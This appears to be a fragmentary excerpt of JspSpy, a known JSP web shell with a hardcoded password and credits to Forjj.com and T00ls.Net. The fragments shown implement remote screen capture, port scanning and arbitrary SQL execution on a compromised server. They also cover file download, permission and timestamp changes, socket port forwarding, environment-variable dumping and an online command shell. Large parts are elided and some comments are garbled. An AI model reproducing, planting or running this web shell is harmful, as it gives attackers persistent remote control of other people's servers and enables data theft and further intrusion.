...
<%!
    private static final String PW = "hongquan"; //password
    private static final String PW_SESSION_ATTRIBUTE = "QWEASDZXC";
...
<%!private static interface Invoker {
	...
	public void invoke(HttpServletRequest request,
		...
		PrintWriter out = response.getWriter();
		out
			.println("<html><head><title>JspSpy Codz By - Ninty</title><style type=\"text/css\">"
	...
	public void invoke(HttpServletRequest request,
		...
		out.println("<script type=\"text/javascript\">"
			+ "	var interval = null;" + "	function a(btn) {"
			+ "		if (btn.value == \"Stop\")" + "		{"
			+ "			sstopClick(btn);" + "		} else {"
			+ "			startClick(btn);" + "		}" + "	}"
			...
			+ "			img.src = \"" + SHELL_NAME
			+ "?o=gc&rnd=\"+Math.random();"
			+ "		},parseInt(pl)*1000);" + "	}"
			+ "	function sstopClick(btn) {"
			+ "		clearInterval(interval);"
			+ "		btn.value = \"Start\";" + "	}" + "  </script>");
		out
			.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"
				+ "  <tr>"
				+ "    <td>"
				+ "        <h2>Remote Control Â»</h2><input class=\"bt\" onclick=\"var img = document.getElementById('screen').src='"
				+ SHELL_NAME
				+ "?o=gc&rnd='+Math.random();\" name=\"getsc\" id=\"getsc\" value=\"Get Screen\" type=\"button\" size=\"100\"  />"
	...
	public void invoke(HttpServletRequest request,
		...
		Rectangle rec = new Rectangle(0, 0, (int) size.getWidth(),
			(int) size.getHeight());
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
				...
				+ ports
				+ "\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout ï¼ç§ï¼ : <input name=\"timeout\" type=\"text\" value=\""
				+ timeout
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("<form action=\""
				...
				+ selectDb
				+ "\"><input type=\"hidden\" name=\"o\" value=\"executesql\"><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database :</td></tr><tr><td><textarea name=\"sql\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">"
				+ Util.htmlEncode(Util.getStr(sql))
				+ "</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p></form></table>");
	    } catch (Exception e) {
		//e.printStackTrace();
		throw e;
	    }
	...
	public void invoke(HttpServletRequest request,
		...
		if (!Util.isEmpty(sql)) {
			...
			if (obj instanceof ResultSet) {
			    ...
			    out
				    .println("<div style='padding:10px'><p><b>Query#0 : "
					    + Util.htmlEncode(sql) + "</b></p>");
			    out
				    .println("<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"><tr class=\"head\">");
			    ...
			    out
				    .println("<div style='margin:10px'><h2>affected rows : <b>"
					    + obj + "</b></h2></div>");
			}
		    }
		} else {
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("<style type=\"text/css\">"
				...
				+ "	  "
				+ "<span style=\"font:11px Verdana;\">Copyright Â© 2015 Dreamer </span></p>"
				+ "    </form>");
	    } catch (Exception e) {
		e.printStackTrace();
		throw e;
...
throw e;
	...
	public void invoke(HttpServletRequest request,
		...
		response
			.getWriter()
			.println(
				"<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2009 <a href=\"http://www.forjj.com\" target=\"_blank\">http://www.Forjj.com/</a>  <a target=\"_blank\" href=\"http://www.t00ls.net/\">[T00ls.Net]</a> All Rights Reserved."
					+ "</div>");
	    } catch (Exception e) {
		e.printStackTrace();
		throw e;
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
				...
				+ "  <input type=\"checkbox\" "
				+ read
				+ " name=\"read\" id=\"checkbox\"> "
				+ "  Write: "
				+ "  <input type=\"checkbox\" "
				+ write
				+ " name=\"write\" id=\"checkbox2\"> "
				+ "  Execute: "
				+ "  <input type=\"checkbox\" "
				+ execute
				+ " name=\"execute\" id=\"checkbox3\">"
				+ "</p>"
				+ "<p>Instead Â»"
				+ "year:"
	...
	public void invoke(HttpServletRequest request,
		...
		response.setHeader("Content-Disposition",
			"attachment;filename="
				+ URLEncoder.encode(f.getName(), PAGE_CHARSET));
		BufferedInputStream input = new BufferedInputStream(
	...
	public void invoke(HttpServletRequest request,
		...
		new Thread(new Runnable() {
			...
			while (true) {
				...
				this.readFromRemote(soc, remoteSoc, remoteIn,
					localOut);
			    } catch (Exception ex) {
				break;
			    }
		    ...
		    public void readFromLocal(final DataInputStream localIn,
		    ...
		    public void readFromRemote(final Socket soc,
			    final Socket remoteSoc,
			    final DataInputStream remoteIn,
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("</ul><h2 id=\"Ninty_H2_Mac\">System Environment >></h2><hr style=\" border: 1px solid #ddd;height:0px;\"/><ul id=\"Ninty_Ul_Sys\" class=\"info\">");
		Map<String, String> envs = System.getenv();
		Set<Map.Entry<String, String>> entrySet = envs.entrySet();
		for (Map.Entry<String, String> en : entrySet) {
		    out.println("<li><u>" + Util.htmlEncode(en.getKey())
			    + " : </u>" + Util.htmlEncode(en.getValue())
			    + "</li>");
		}
		out
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("<form action=\""
				...
				+ "	<tr class=\"head\">"
				+ "		<td><span style=\"float:right;\"><a href=\"http://www.forjj.com\" target=\"_blank\">JspSpy Ver: 2009</a></span>"
	...
	public void invoke(HttpServletRequest request,
		...
		out
			.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"
				+ "  <tr>" + "    <td>");
		out.println("<h2>Shell OnLine Â»</h2><br/>");
		out
			.println("<form action=\""
				+ SHELL_NAME
	...
	public void invoke(HttpServletRequest request,
		...
		if (type.toLowerCase().equals("start")) {
		    ...
		    new OnLineConnector(pro.getErrorStream(), response
			    .getOutputStream(), "exeRclientO", olp).start();//éè¯¯ä¿¡æ¯æµã
...
<%
    try {
		...
		Util.outMsg(out, Util
			.htmlEncode(new String(bout.toByteArray())).replace(
				"\n", "<br/>"), "left");
		bout.close();
		out.flush();
